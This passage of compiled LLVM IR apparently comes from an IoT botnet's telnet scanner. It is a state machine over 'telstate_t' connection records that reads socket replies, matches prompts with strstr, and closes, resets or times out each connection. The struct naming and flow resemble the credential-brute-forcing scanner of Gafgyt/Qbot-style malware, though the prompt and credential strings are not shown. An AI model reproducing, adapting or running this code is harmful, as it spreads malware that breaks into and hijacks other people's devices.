  %1538 = sext i32 %1537 to i64
  %1539 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1538
  %1540 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1539, i32 0, i32 7
  store i16 0, i16* %1540, align 16
  %1541 = load i32, i32* %2, align 4
  %1542 = sext i32 %1541 to i64
  %1543 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1542
  %1544 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1543, i32 0, i32 8
  %1545 = load i8*, i8** %1544, align 8
  %1546 = call i8* @strstr(i8* %1545, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.66, i32 0, i32 0)) #10
  %1547 = icmp ne i8* %1546, null
  br i1 %1547, label %1548, label %1568

; <label>:1548:                                   ; preds = %1532
  %1549 = load i32, i32* %2, align 4
  %1550 = sext i32 %1549 to i64
  %1551 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1550
  %1552 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1551, i32 0, i32 8
  %1553 = load i8*, i8** %1552, align 8
  call void @llvm.memset.p0i8.i64(i8* %1553, i8 0, i64 1024, i32 1, i1 false)
  %1554 = load i32, i32* %2, align 4
  %1555 = sext i32 %1554 to i64
  %1556 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1555
  %1557 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1556, i32 0, i32 0
  %1558 = load i32, i32* %1557, align 16
  %1559 = call i32 @sclose(i32 %1558)
  %1560 = load i32, i32* %2, align 4
  %1561 = sext i32 %1560 to i64
  %1562 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1561
  %1563 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1562, i32 0, i32 2
  store i8 0, i8* %1563, align 8
  %1564 = load i32, i32* %2, align 4
  %1565 = sext i32 %1564 to i64
  %1566 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1565
  %1567 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1566, i32 0, i32 3
  store i8 0, i8* %1567, align 1
  br label %2316

; <label>:1568:                                   ; preds = %1532
  %1569 = load i32, i32* %2, align 4
  %1570 = sext i32 %1569 to i64
  %1571 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1570
  %1572 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1571, i32 0, i32 2
  store i8 7, i8* %1572, align 8
  br label %1573

; <label>:1573:                                   ; preds = %1568
  %1574 = load i32, i32* %2, align 4
  %1575 = sext i32 %1574 to i64
  %1576 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1575
  %1577 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1576, i32 0, i32 8
  %1578 = load i8*, i8** %1577, align 8
  call void @llvm.memset.p0i8.i64(i8* %1578, i8 0, i64 1024, i32 1, i1 false)
  br label %2316

; <label>:1579:                                   ; preds = %1513
  %1580 = load i32, i32* %2, align 4
  %1581 = sext i32 %1580 to i64
  %1582 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1581
  %1583 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1582, i32 0, i32 0
  %1584 = load i32, i32* %1583, align 16
  %1585 = load i32, i32* %2, align 4
  %1586 = sext i32 %1585 to i64
  %1587 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1586
  %1588 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1587, i32 0, i32 8
  %1589 = load i8*, i8** %1588, align 8
  %1590 = load i32, i32* %2, align 4
  %1591 = sext i32 %1590 to i64
  %1592 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1591
  %1593 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1592, i32 0, i32 7
  %1594 = load i16, i16* %1593, align 16
  %1595 = zext i16 %1594 to i32
  %1596 = call i32 @readUntil(i32 %1584, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1589, i32 1024, i32 %1595)
  %1597 = icmp ne i32 %1596, 0
  br i1 %1597, label %1598, label %1645

; <label>:1598:                                   ; preds = %1579
  %1599 = load i32, i32* %2, align 4
  %1600 = sext i32 %1599 to i64
  %1601 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1600
  %1602 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1601, i32 0, i32 6
  store i32 0, i32* %1602, align 4
  %1603 = load i32, i32* %2, align 4
  %1604 = sext i32 %1603 to i64
  %1605 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1604
  %1606 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1605, i32 0, i32 7
  store i16 0, i16* %1606, align 16
  %1607 = load i32, i32* %2, align 4
  %1608 = sext i32 %1607 to i64
  %1609 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1608
  %1610 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1609, i32 0, i32 8
  %1611 = load i8*, i8** %1610, align 8
  %1612 = call i8* @strstr(i8* %1611, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i32 0, i32 0)) #10
  %1613 = icmp ne i8* %1612, null
  br i1 %1613, label %1614, label %1634

; <label>:1614:                                   ; preds = %1598
  %1615 = load i32, i32* %2, align 4
  %1616 = sext i32 %1615 to i64
  %1617 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1616
  %1618 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1617, i32 0, i32 8
  %1619 = load i8*, i8** %1618, align 8
  call void @llvm.memset.p0i8.i64(i8* %1619, i8 0, i64 1024, i32 1, i1 false)
  %1620 = load i32, i32* %2, align 4
  %1621 = sext i32 %1620 to i64
  %1622 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1621
  %1623 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1622, i32 0, i32 0
  %1624 = load i32, i32* %1623, align 16
  %1625 = call i32 @sclose(i32 %1624)
  %1626 = load i32, i32* %2, align 4
  %1627 = sext i32 %1626 to i64
  %1628 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1627
  %1629 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1628, i32 0, i32 2
  store i8 0, i8* %1629, align 8
  %1630 = load i32, i32* %2, align 4
  %1631 = sext i32 %1630 to i64
  %1632 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1631
  %1633 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1632, i32 0, i32 3
  store i8 0, i8* %1633, align 1
  br label %2316

; <label>:1634:                                   ; preds = %1598
  %1635 = load i32, i32* %2, align 4
  %1636 = sext i32 %1635 to i64
  %1637 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1636
  %1638 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1637, i32 0, i32 2
  store i8 7, i8* %1638, align 8
  br label %1639

; <label>:1639:                                   ; preds = %1634
  %1640 = load i32, i32* %2, align 4
  %1641 = sext i32 %1640 to i64
  %1642 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1641
  %1643 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1642, i32 0, i32 8
  %1644 = load i8*, i8** %1643, align 8
  call void @llvm.memset.p0i8.i64(i8* %1644, i8 0, i64 1024, i32 1, i1 false)
  br label %2316

; <label>:1645:                                   ; preds = %1579
  %1646 = load i32, i32* %2, align 4
  %1647 = sext i32 %1646 to i64
  %1648 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1647
  %1649 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1648, i32 0, i32 0
  %1650 = load i32, i32* %1649, align 16
  %1651 = load i32, i32* %2, align 4
  %1652 = sext i32 %1651 to i64
  %1653 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1652
  %1654 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1653, i32 0, i32 8
  %1655 = load i8*, i8** %1654, align 8
  %1656 = load i32, i32* %2, align 4
  %1657 = sext i32 %1656 to i64
  %1658 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1657
  %1659 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1658, i32 0, i32 7
  %1660 = load i16, i16* %1659, align 16
  %1661 = zext i16 %1660 to i32
  %1662 = call i32 @readUntil(i32 %1650, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.68, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1655, i32 1024, i32 %1661)
  %1663 = icmp ne i32 %1662, 0
  br i1 %1663, label %1664, label %1711

; <label>:1664:                                   ; preds = %1645
  %1665 = load i32, i32* %2, align 4
  %1666 = sext i32 %1665 to i64
  %1667 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1666
  %1668 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1667, i32 0, i32 6
  store i32 0, i32* %1668, align 4
  %1669 = load i32, i32* %2, align 4
  %1670 = sext i32 %1669 to i64
  %1671 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1670
  %1672 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1671, i32 0, i32 7
  store i16 0, i16* %1672, align 16
  %1673 = load i32, i32* %2, align 4
  %1674 = sext i32 %1673 to i64
  %1675 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1674
  %1676 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1675, i32 0, i32 8
  %1677 = load i8*, i8** %1676, align 8
  %1678 = call i8* @strstr(i8* %1677, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.68, i32 0, i32 0)) #10
  %1679 = icmp ne i8* %1678, null
  br i1 %1679, label %1680, label %1700

; <label>:1680:                                   ; preds = %1664
  %1681 = load i32, i32* %2, align 4
  %1682 = sext i32 %1681 to i64
  %1683 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1682
  %1684 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1683, i32 0, i32 8
  %1685 = load i8*, i8** %1684, align 8
  call void @llvm.memset.p0i8.i64(i8* %1685, i8 0, i64 1024, i32 1, i1 false)
  %1686 = load i32, i32* %2, align 4
  %1687 = sext i32 %1686 to i64
  %1688 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1687
  %1689 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1688, i32 0, i32 0
  %1690 = load i32, i32* %1689, align 16
  %1691 = call i32 @sclose(i32 %1690)
  %1692 = load i32, i32* %2, align 4
  %1693 = sext i32 %1692 to i64
  %1694 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1693
  %1695 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1694, i32 0, i32 2
  store i8 0, i8* %1695, align 8
  %1696 = load i32, i32* %2, align 4
  %1697 = sext i32 %1696 to i64
  %1698 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1697
  %1699 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1698, i32 0, i32 3
  store i8 0, i8* %1699, align 1
  br label %2316

; <label>:1700:                                   ; preds = %1664
  %1701 = load i32, i32* %2, align 4
  %1702 = sext i32 %1701 to i64
  %1703 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1702
  %1704 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1703, i32 0, i32 2
  store i8 7, i8* %1704, align 8
  br label %1705

; <label>:1705:                                   ; preds = %1700
  %1706 = load i32, i32* %2, align 4
  %1707 = sext i32 %1706 to i64
  %1708 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1707
  %1709 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1708, i32 0, i32 8
  %1710 = load i8*, i8** %1709, align 8
  call void @llvm.memset.p0i8.i64(i8* %1710, i8 0, i64 1024, i32 1, i1 false)
  br label %2316

; <label>:1711:                                   ; preds = %1645
  %1712 = load i32, i32* %2, align 4
  %1713 = sext i32 %1712 to i64
  %1714 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1713
  %1715 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1714, i32 0, i32 0
  %1716 = load i32, i32* %1715, align 16
  %1717 = load i32, i32* %2, align 4
  %1718 = sext i32 %1717 to i64
  %1719 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1718
  %1720 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1719, i32 0, i32 8
  %1721 = load i8*, i8** %1720, align 8
  %1722 = load i32, i32* %2, align 4
  %1723 = sext i32 %1722 to i64
  %1724 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1723
  %1725 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1724, i32 0, i32 7
  %1726 = load i16, i16* %1725, align 16
  %1727 = zext i16 %1726 to i32
  %1728 = call i32 @readUntil(i32 %1716, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.69, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1721, i32 1024, i32 %1727)
  %1729 = icmp ne i32 %1728, 0
  br i1 %1729, label %1730, label %1777

; <label>:1730:                                   ; preds = %1711
  %1731 = load i32, i32* %2, align 4
  %1732 = sext i32 %1731 to i64
  %1733 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1732
  %1734 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1733, i32 0, i32 6
  store i32 0, i32* %1734, align 4
  %1735 = load i32, i32* %2, align 4
  %1736 = sext i32 %1735 to i64
  %1737 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1736
  %1738 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1737, i32 0, i32 7
  store i16 0, i16* %1738, align 16
  %1739 = load i32, i32* %2, align 4
  %1740 = sext i32 %1739 to i64
  %1741 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1740
  %1742 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1741, i32 0, i32 8
  %1743 = load i8*, i8** %1742, align 8
  %1744 = call i8* @strstr(i8* %1743, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.69, i32 0, i32 0)) #10
  %1745 = icmp ne i8* %1744, null
  br i1 %1745, label %1746, label %1766

; <label>:1746:                                   ; preds = %1730
  %1747 = load i32, i32* %2, align 4
  %1748 = sext i32 %1747 to i64
  %1749 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1748
  %1750 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1749, i32 0, i32 8
  %1751 = load i8*, i8** %1750, align 8
  call void @llvm.memset.p0i8.i64(i8* %1751, i8 0, i64 1024, i32 1, i1 false)
  %1752 = load i32, i32* %2, align 4
  %1753 = sext i32 %1752 to i64
  %1754 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1753
  %1755 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1754, i32 0, i32 0
  %1756 = load i32, i32* %1755, align 16
  %1757 = call i32 @sclose(i32 %1756)
  %1758 = load i32, i32* %2, align 4
  %1759 = sext i32 %1758 to i64
  %1760 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1759
  %1761 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1760, i32 0, i32 2
  store i8 0, i8* %1761, align 8
  %1762 = load i32, i32* %2, align 4
  %1763 = sext i32 %1762 to i64
  %1764 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1763
  %1765 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1764, i32 0, i32 3
  store i8 0, i8* %1765, align 1
  br label %2316

; <label>:1766:                                   ; preds = %1730
  %1767 = load i32, i32* %2, align 4
  %1768 = sext i32 %1767 to i64
  %1769 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1768
  %1770 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1769, i32 0, i32 2
  store i8 7, i8* %1770, align 8
  br label %1771

; <label>:1771:                                   ; preds = %1766
  %1772 = load i32, i32* %2, align 4
  %1773 = sext i32 %1772 to i64
  %1774 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1773
  %1775 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1774, i32 0, i32 8
  %1776 = load i8*, i8** %1775, align 8
  call void @llvm.memset.p0i8.i64(i8* %1776, i8 0, i64 1024, i32 1, i1 false)
  br label %2316

; <label>:1777:                                   ; preds = %1711
  %1778 = load i32, i32* %2, align 4
  %1779 = sext i32 %1778 to i64
  %1780 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1779
  %1781 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1780, i32 0, i32 0
  %1782 = load i32, i32* %1781, align 16
  %1783 = load i32, i32* %2, align 4
  %1784 = sext i32 %1783 to i64
  %1785 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1784
  %1786 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1785, i32 0, i32 8
  %1787 = load i8*, i8** %1786, align 8
  %1788 = load i32, i32* %2, align 4
  %1789 = sext i32 %1788 to i64
  %1790 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1789
  %1791 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1790, i32 0, i32 7
  %1792 = load i16, i16* %1791, align 16
  %1793 = zext i16 %1792 to i32
  %1794 = call i32 @readUntil(i32 %1782, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.70, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1787, i32 1024, i32 %1793)
  %1795 = icmp ne i32 %1794, 0
  br i1 %1795, label %1796, label %1843

; <label>:1796:                                   ; preds = %1777
  %1797 = load i32, i32* %2, align 4
  %1798 = sext i32 %1797 to i64
  %1799 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1798
  %1800 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1799, i32 0, i32 6
  store i32 0, i32* %1800, align 4
  %1801 = load i32, i32* %2, align 4
  %1802 = sext i32 %1801 to i64
  %1803 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1802
  %1804 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1803, i32 0, i32 7
  store i16 0, i16* %1804, align 16
  %1805 = load i32, i32* %2, align 4
  %1806 = sext i32 %1805 to i64
  %1807 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1806
  %1808 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1807, i32 0, i32 8
  %1809 = load i8*, i8** %1808, align 8
  %1810 = call i8* @strstr(i8* %1809, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.70, i32 0, i32 0)) #10
  %1811 = icmp ne i8* %1810, null
  br i1 %1811, label %1812, label %1832

; <label>:1812:                                   ; preds = %1796
  %1813 = load i32, i32* %2, align 4
  %1814 = sext i32 %1813 to i64
  %1815 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1814
  %1816 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1815, i32 0, i32 8
  %1817 = load i8*, i8** %1816, align 8
  call void @llvm.memset.p0i8.i64(i8* %1817, i8 0, i64 1024, i32 1, i1 false)
  %1818 = load i32, i32* %2, align 4
  %1819 = sext i32 %1818 to i64
  %1820 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1819
  %1821 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1820, i32 0, i32 0
  %1822 = load i32, i32* %1821, align 16
  %1823 = call i32 @sclose(i32 %1822)
  %1824 = load i32, i32* %2, align 4
  %1825 = sext i32 %1824 to i64
  %1826 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1825
  %1827 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1826, i32 0, i32 2
  store i8 0, i8* %1827, align 8
  %1828 = load i32, i32* %2, align 4
  %1829 = sext i32 %1828 to i64
  %1830 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1829
  %1831 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1830, i32 0, i32 3
  store i8 0, i8* %1831, align 1
  br label %2316

; <label>:1832:                                   ; preds = %1796
  %1833 = load i32, i32* %2, align 4
  %1834 = sext i32 %1833 to i64
  %1835 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1834
  %1836 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1835, i32 0, i32 2
  store i8 7, i8* %1836, align 8
  br label %1837

; <label>:1837:                                   ; preds = %1832
  %1838 = load i32, i32* %2, align 4
  %1839 = sext i32 %1838 to i64
  %1840 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1839
  %1841 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1840, i32 0, i32 8
  %1842 = load i8*, i8** %1841, align 8
  call void @llvm.memset.p0i8.i64(i8* %1842, i8 0, i64 1024, i32 1, i1 false)
  br label %2316

; <label>:1843:                                   ; preds = %1777
  %1844 = load i32, i32* %2, align 4
  %1845 = sext i32 %1844 to i64
  %1846 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1845
  %1847 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1846, i32 0, i32 0
  %1848 = load i32, i32* %1847, align 16
  %1849 = load i32, i32* %2, align 4
  %1850 = sext i32 %1849 to i64
  %1851 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1850
  %1852 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1851, i32 0, i32 8
  %1853 = load i8*, i8** %1852, align 8
  %1854 = load i32, i32* %2, align 4
  %1855 = sext i32 %1854 to i64
  %1856 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1855
  %1857 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1856, i32 0, i32 7
  %1858 = load i16, i16* %1857, align 16
  %1859 = zext i16 %1858 to i32
  %1860 = call i32 @readUntil(i32 %1848, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.71, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1853, i32 1024, i32 %1859)
  %1861 = icmp ne i32 %1860, 0
  br i1 %1861, label %1862, label %1909

; <label>:1862:                                   ; preds = %1843
  %1863 = load i32, i32* %2, align 4
  %1864 = sext i32 %1863 to i64
  %1865 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1864
  %1866 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1865, i32 0, i32 6
  store i32 0, i32* %1866, align 4
  %1867 = load i32, i32* %2, align 4
  %1868 = sext i32 %1867 to i64
  %1869 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1868
  %1870 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1869, i32 0, i32 7
  store i16 0, i16* %1870, align 16
  %1871 = load i32, i32* %2, align 4
  %1872 = sext i32 %1871 to i64
  %1873 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1872
  %1874 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1873, i32 0, i32 8
  %1875 = load i8*, i8** %1874, align 8
  %1876 = call i8* @strstr(i8* %1875, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.71, i32 0, i32 0)) #10
  %1877 = icmp ne i8* %1876, null
  br i1 %1877, label %1878, label %1898

; <label>:1878:                                   ; preds = %1862
  %1879 = load i32, i32* %2, align 4
  %1880 = sext i32 %1879 to i64
  %1881 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1880
  %1882 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1881, i32 0, i32 8
  %1883 = load i8*, i8** %1882, align 8
  call void @llvm.memset.p0i8.i64(i8* %1883, i8 0, i64 1024, i32 1, i1 false)
  %1884 = load i32, i32* %2, align 4
  %1885 = sext i32 %1884 to i64
  %1886 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1885
  %1887 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1886, i32 0, i32 0
  %1888 = load i32, i32* %1887, align 16
  %1889 = call i32 @sclose(i32 %1888)
  %1890 = load i32, i32* %2, align 4
  %1891 = sext i32 %1890 to i64
  %1892 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1891
  %1893 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1892, i32 0, i32 2
  store i8 0, i8* %1893, align 8
  %1894 = load i32, i32* %2, align 4
  %1895 = sext i32 %1894 to i64
  %1896 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1895
  %1897 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1896, i32 0, i32 3
  store i8 0, i8* %1897, align 1
  br label %2316

; <label>:1898:                                   ; preds = %1862
  %1899 = load i32, i32* %2, align 4
  %1900 = sext i32 %1899 to i64
  %1901 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1900
  %1902 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1901, i32 0, i32 2
  store i8 7, i8* %1902, align 8
  br label %1903

; <label>:1903:                                   ; preds = %1898
  %1904 = load i32, i32* %2, align 4
  %1905 = sext i32 %1904 to i64
  %1906 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1905
  %1907 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1906, i32 0, i32 8
  %1908 = load i8*, i8** %1907, align 8
  call void @llvm.memset.p0i8.i64(i8* %1908, i8 0, i64 1024, i32 1, i1 false)
  br label %2316

; <label>:1909:                                   ; preds = %1843
  %1910 = load i32, i32* %2, align 4
  %1911 = sext i32 %1910 to i64
  %1912 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1911
  %1913 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1912, i32 0, i32 8
  %1914 = load i8*, i8** %1913, align 8
  %1915 = call i64 @strlen(i8* %1914) #10
  %1916 = trunc i64 %1915 to i16
  %1917 = load i32, i32* %2, align 4
  %1918 = sext i32 %1917 to i64
  %1919 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1918
  %1920 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1919, i32 0, i32 7
  store i16 %1916, i16* %1920, align 16
  br label %1921

; <label>:1921:                                   ; preds = %1909
  %1922 = load i32, i32* %2, align 4
  %1923 = sext i32 %1922 to i64
  %1924 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1923
  %1925 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1924, i32 0, i32 6
  %1926 = load i32, i32* %1925, align 4
  %1927 = sub i32 0, 10
  %1928 = sub i32 %1926, %1927
  %1929 = add i32 %1926, 10
  %1930 = zext i32 %1928 to i64
  %1931 = call i64 @time(i64* null) #2
  %1932 = icmp slt i64 %1930, %1931
  br i1 %1932, label %1933, label %1948

; <label>:1933:                                   ; preds = %1921
  %1934 = load i32, i32* %2, align 4
  %1935 = sext i32 %1934 to i64
  %1936 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1935
  %1937 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1936, i32 0, i32 0
  %1938 = load i32, i32* %1937, align 16
  %1939 = call i32 @sclose(i32 %1938)
  %1940 = load i32, i32* %2, align 4
  %1941 = sext i32 %1940 to i64
  %1942 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1941
  %1943 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1942, i32 0, i32 2
  store i8 0, i8* %1943, align 8
  %1944 = load i32, i32* %2, align 4
  %1945 = sext i32 %1944 to i64
  %1946 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1945
  %1947 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1946, i32 0, i32 3
  store i8 1, i8* %1947, align 1
  br label %1948

; <label>:1948:                                   ; preds = %1933, %1921
  br label %2315

; <label>:1949:                                   ; preds = %71
  %1950 = load i32, i32* %2, align 4
  %1951 = sext i32 %1950 to i64
  %1952 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1951
  %1953 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1952, i32 0, i32 0
  %1954 = load i32, i32* %1953, align 16
  %1955 = call i64 @send(i32 %1954, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.72, i32 0, i32 0), i64 4, i32 16384)
  %1956 = icmp slt i64 %1955, 0
  br i1 %1956, label %1957, label %1972

; <label>:1957:                                   ; preds = %1949
  %1958 = load i32, i32* %2, align 4
  %1959 = sext i32 %1958 to i64
  %1960 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1959
  %1961 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1960, i32 0, i32 0
  %1962 = load i32, i32* %1961, align 16
  %1963 = call i32 @sclose(i32 %1962)
  %1964 = load i32, i32* %2, align 4
